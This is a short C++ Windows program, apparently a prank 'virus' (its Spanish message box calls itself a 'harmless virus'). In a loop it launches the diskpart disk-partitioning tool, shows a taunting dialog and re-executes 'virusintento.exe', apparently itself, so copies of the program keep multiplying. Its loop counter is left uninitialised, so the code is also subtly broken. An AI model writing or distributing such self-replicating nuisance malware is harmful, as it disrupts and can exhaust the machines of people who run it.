#include<iostream>
#include <windows.h>
#include <cstdlib>

using namespace std;

int main(){
	
	for(int i; i<10; i++){
    system("diskpart");
    
     MessageBox(NULL,"no aprietes x o aceptar o te jodes una y otra vez, este es un virus inofensivo", "Virus", MB_OK | MB_ICONINFORMATION);
     
     ShellExecute(NULL, "open", "virusintento.exe",NULL, NULL, SW_SHOWNORMAL); 
	}
}